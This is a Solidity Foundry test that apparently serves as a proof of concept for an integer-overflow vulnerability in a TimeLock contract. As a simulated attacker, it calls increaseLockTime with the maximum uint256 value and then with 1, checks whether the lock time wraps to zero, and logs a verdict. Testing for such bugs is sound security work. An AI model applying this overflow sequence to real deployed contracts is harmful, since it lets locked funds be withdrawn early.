// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/timelock.sol";

contract TimeLockTest is Test {
    TimeLock public timeLock;
    address public attacker = address(1);

    function setUp() public {
        timeLock = new TimeLock();
    }

    function testLockTimeOverflow() public {
        vm.startPrank(attacker);

        // Pre-trigger: Initial lock time snapshot
        console.log("--- BEFORE Trigger ---");
        uint256 initialLockTime = timeLock.lockTime(attacker);
        console.log("Initial lock time: ", initialLockTime);

        // First trigger: Set lock time near max
        console.log("--- FIRST TRIGGER: increaseLockTime(type(uint256).max) ---");
        timeLock.increaseLockTime(type(uint256).max);
        uint256 afterFirst = timeLock.lockTime(attacker);
        console.log("Lock time after first increase: ", afterFirst);

        // Pre-trigger for overflow: Should be max
        console.log("--- BEFORE SECOND TRIGGER ---");
        uint256 beforeOverflow = timeLock.lockTime(attacker);
        console.log("Lock time before overflow trigger: ", beforeOverflow);

        // Second trigger: Overflow by adding 1
        console.log("--- SECOND TRIGGER: increaseLockTime(1) ---");
        timeLock.increaseLockTime(1);
        uint256 afterOverflow = timeLock.lockTime(attacker);
        console.log("Lock time after overflow trigger: ", afterOverflow);

        console.log("--- RESULT: State Comparison ---");
        bool overflowOccurred = (afterOverflow == 0);
        console.log("Overflow occurred (0 != max)?: ", overflowOccurred ? "YES" : "NO");
        
        vm.stopPrank();

        // Final vulnerability verdict
        if (overflowOccurred) {
            console.log("Vulnerability Exists: Lock time overflowed to 0");
        } else {
            console.log("Vulnerability not Exist: Lock time did not overflow to 0");
        }
    }
}